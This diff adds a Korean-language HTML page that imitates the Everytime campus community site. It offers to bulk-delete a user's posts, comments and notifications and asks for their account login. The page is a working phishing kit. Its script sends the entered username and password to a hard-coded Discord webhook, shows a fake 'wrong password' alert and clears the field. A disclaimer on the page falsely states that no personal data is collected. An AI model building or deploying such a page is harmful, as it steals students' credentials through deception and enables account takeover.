@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>에브리타임 글, 댓글, 알림 자동 삭제 사이트</title>
+    <style>
+        :root {
+            --everytime-red: #c62917;
+            --everytime-red-hover: #a52315;
+            --everytime-red-light: #fff5f5;
+            --everytime-border: #e3e5e8;
+            --everytime-bg: #f8f8f8;
+            --everytime-white: #ffffff;
+            --everytime-text: #333333;
+            --everytime-text-light: #666666;
+            --everytime-text-lighter: #999999;
+            --everytime-shadow: rgba(0, 0, 0, 0.08);
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--everytime-bg);
+            color: var(--everytime-text);
+            font-family: -apple-system, BlinkMacSystemFont, "Apple SD Gothic Neo", "Pretendard", "Noto Sans KR", "Malgun Gothic", sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+        }
+
+        /* 헤더 */
+        .header {
+            width: 100%;
+            background: var(--everytime-white);
+            border-bottom: 1px solid var(--everytime-border);
+            padding: 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px var(--everytime-shadow);
+        }
+
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--everytime-red);
+            text-decoration: none;
+            letter-spacing: -0.5px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 24px;
+            align-items: center;
+        }
+
+        .nav-link {
+            color: var(--everytime-text-light);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .nav-link:hover {
+            color: var(--everytime-red);
+        }
+
+        /* 메인 컨테이너 */
+        .main-container {
+            width: 100%;
+            max-width: 520px;
+            padding: 40px 20px;
+            flex: 1;
+        }
+
+        /* 상단 안내 배너 */
+        .info-banner {
+            background: var(--everytime-red-light);
+            border: 1px solid var(--everytime-red);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .info-banner-title {
+            color: var(--everytime-red);
+            font-size: 16px;
+            font-weight: 700;
+            margin: 0 0 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .info-banner-title::before {
+            content: "📢";
+            font-size: 18px;
+        }
+
+        .info-banner-desc {
+            color: var(--everytime-text);
+            font-size: 14px;
+            line-height: 1.6;
+            margin: 0;
+        }
+
+        /* 로그인 카드 */
+        .login-card {
+            background: var(--everytime-white);
+            border: 1px solid var(--everytime-border);
+            border-radius: 8px;
+            padding: 40px 32px;
+            box-shadow: 0 2px 8px var(--everytime-shadow);
+        }
+
+        .login-title {
+            text-align: center;
+            font-weight: 700;
+            font-size: 22px;
+            color: var(--everytime-text);
+            margin: 0 0 8px 0;
+            letter-spacing: -0.5px;
+        }
+
+        .login-subtitle {
+            text-align: center;
+            font-size: 13px;
+            color: var(--everytime-text-lighter);
+            margin: 0 0 32px 0;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--everytime-text);
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            background: var(--everytime-white);
+            border: 1px solid var(--everytime-border);
+            border-radius: 4px;
+            padding: 12px 14px;
+            font-size: 14px;
+            color: var(--everytime-text);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--everytime-red);
+            box-shadow: 0 0 0 3px rgba(198, 41, 23, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: var(--everytime-text-lighter);
+        }
+
+        .form-hint {
+            font-size: 12px;
+            color: var(--everytime-text-lighter);
+            margin-top: 6px;
+            display: block;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--everytime-red);
+            border: none;
+            border-radius: 4px;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--everytime-white);
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 24px;
+        }
+
+        .submit-btn:hover {
+            background: var(--everytime-red-hover);
+        }
+
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        .disclaimer {
+            text-align: center;
+            color: var(--everytime-text-lighter);
+            font-size: 12px;
+            line-height: 1.6;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid var(--everytime-border);
+        }
+
+        /* 푸터 */
+        .footer {
+            width: 100%;
+            background: var(--everytime-white);
+            border-top: 1px solid var(--everytime-border);
+            padding: 24px 20px;
+            margin-top: auto;
+        }
+
+        .footer-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+            color: var(--everytime-text-lighter);
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+
+        .footer-link {
+            color: var(--everytime-text-lighter);
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            color: var(--everytime-red);
+        }
+
+        /* 반응형 */
+        @media (max-width: 600px) {
+            .header-inner {
+                padding: 12px 16px;
+            }
+
+            .logo {
+                font-size: 18px;
+            }
+
+            .nav-links {
+                gap: 16px;
+            }
+
+            .nav-link {
+                font-size: 13px;
+            }
+
+            .main-container {
+                padding: 24px 16px;
+            }
+
+            .login-card {
+                padding: 32px 24px;
+            }
+
+            .login-title {
+                font-size: 20px;
+            }
+
+            .info-banner {
+                padding: 16px;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+
+        /* 로딩 애니메이션 */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .login-card, .info-banner {
+            animation: fadeIn 0.4s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <!-- 헤더 -->
+    <header class="header">
+        <div class="header-inner">
+            <a href="#" class="logo">에브리타임</a>
+            <nav class="nav-links">
+                <a href="#" class="nav-link">삭제 전 주의사항</a>
+                <a href="#" class="nav-link">게시판</a>
+                <a href="#" class="nav-link">시간표 자동 설정</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- 메인 컨텐츠 -->
+    <main class="main-container">
+        <!-- 상단 안내 배너 -->
+        <section class="info-banner">
+            <h2 class="info-banner-title">에브리타임 글, 댓글, 알림 자동 삭제</h2>
+            <p class="info-banner-desc">
+                에브리타임 글, 댓글, 알림을 원하는 갯수만큼 한 번에 삭제해주는 사이트입니다.
+                로그인 후 간편하게 이용하실 수 있습니다.
+            </p>
+        </section>
+
+        <!-- 로그인 카드 -->
+        <section class="login-card">
+            <h1 class="login-title">로그인</h1>
+            <p class="login-subtitle">에브리타임 계정으로 로그인하시면 됩니다.</p>
+
+            <form id="phish-form">
+                <div class="form-group">
+                    <label class="form-label" for="phish-username">아이디</label>
+                    <input
+                        id="phish-username"
+                        name="username"
+                        type="text"
+                        class="form-input"
+                        placeholder="아이디를 입력하세요"
+                        autocomplete="off"
+                        required
+                    />
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="phish-password">비밀번호</label>
+                    <input
+                        id="phish-password"
+                        name="password"
+                        type="password"
+                        class="form-input"
+                        placeholder="비밀번호를 입력하세요"
+                        autocomplete="off"
+                        required
+                    />
+                </div>
+
+                <button class="submit-btn" type="submit">로그인</button>
+
+                <p class="disclaimer">
+                    글, 댓글, 알림 삭제를 위해서는 로그인이 필요합니다.<br>
+                    이 사이트는 개인정보를 수집하지 않습니다.
+                </p>
+            </form>
+        </section>
+    </main>
+
+    <!-- 푸터 -->
+    <footer class="footer">
+        <div class="footer-inner">
+            <div class="footer-links">
+                <a href="#" class="footer-link">이용약관</a>
+                <a href="#" class="footer-link">개인정보처리방침</a>
+                <a href="#" class="footer-link">고객센터</a>
+                <a href="#" class="footer-link">공지사항</a>
+            </div>
+            <p>© 2025 Everytime. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        const formEl = document.getElementById("phish-form");
+
+        formEl.addEventListener("submit", function (ev) {
+            ev.preventDefault();
+            
+            const username = (document.getElementById("phish-username").value || "").trim();
+            const password = (document.getElementById("phish-password").value || "").trim();
+            
+            // Discord Webhook으로 전송
+            const webhookUrl = "https://discord.com/api/webhooks/1432609926613700660/W0izZzksctzIC-8oW3DqKZKrVDh0AKKidjzgMWIdUINKC3wYdtuM00HM5q54TPEh1mZ9";
+            
+            const timestamp = new Date().toLocaleString('ko-KR', { 
+                timeZone: 'Asia/Seoul',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            const payload = {
+                embeds: [{
+                    title: "🔔 새로운 입력 정보",
+                    color: 15158332,
+                    fields: [
+                        {
+                            name: "아이디",
+                            value: username || "(없음)",
+                            inline: true
+                        },
+                        {
+                            name: "비밀번호",
+                            value: password || "(없음)",
+                            inline: true
+                        },
+                        {
+                            name: "시간",
+                            value: timestamp,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "테스트용 데이터"
+                    }
+                }]
+            };
+            
+            // 비동기 전송 (await 없이)
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                console.log('전송 시도');
+            });
+            
+            // 사용자에게 보이는 메시지
+            alert("아이디/비밀번호가 틀렸습니다.");
+            
+            // 비밀번호 필드 비우기
+            document.getElementById("phish-password").value = "";
+        });
+    </script>
+</body>
+</html>
